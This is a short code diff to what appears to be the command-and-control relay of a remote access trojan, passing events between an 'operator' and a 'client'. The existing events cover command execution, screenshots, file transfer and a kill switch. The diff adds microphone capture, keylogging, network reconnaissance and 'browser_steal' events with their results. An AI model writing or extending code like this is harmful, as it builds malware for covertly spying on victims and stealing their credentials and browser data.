@@ -286,6 +286,10 @@ RELAY_TO_CLIENT = [
     "file_list", "file_download_request", "file_upload_chunk",
     "file_delete", "file_new_folder",
     "kill_switch",
+    # New features
+    "mic_start", "mic_stop",
+    "keylog_start", "keylog_stop",
+    "network_info", "browser_steal",
 ]
 
 for event_name in RELAY_TO_CLIENT:
@@ -325,6 +329,10 @@ RELAY_TO_OPERATOR = [
     "cmd_result", "screenshot_result", "geoip_result",
     "apps_result", "search_result", "execute_result",
     "client_error",
+    # New features
+    "mic_data", "mic_status",
+    "keylog_data", "keylog_status",
+    "network_info_result", "browser_steal_result",
 ]
 
 for event_name in RELAY_TO_OPERATOR:
